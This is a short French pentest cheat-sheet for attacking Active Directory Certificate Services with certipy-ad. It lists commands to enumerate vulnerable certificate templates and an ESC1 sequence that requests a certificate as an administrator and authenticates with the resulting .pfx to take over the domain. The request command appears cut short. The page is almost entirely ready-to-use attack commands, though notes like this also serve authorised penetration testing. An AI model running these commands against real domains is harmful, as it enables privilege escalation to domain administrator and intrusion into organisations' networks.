# ADCS

```
# certipy-ad find -u '<USER>@<DOMAIN.LOCAL>' -password '<PASS>' -dc-ip <DC-IP> -scheme ldap
# Lire le fichier pour trouver les certificats vulnérables
```



#### ESC1

<pre><code><strong># certipy-ad req -u '&#x3C;USER>@&#x3C;DOMAIN.LOCAL>' -password '&#x3C;PASS>' -target-ip &#x3C;SERVEUR QUI GERE LES CERTS> -ca
</strong># certipy-ad auth -pfx 'administrat&#x3C;eur/or>.pfx' -username 'administrat&#x3C;eur/or>' -domain &#x3C;DOMAIN.LOCAL> -dc-ip &#x3C;DC-IP>
</code></pre>
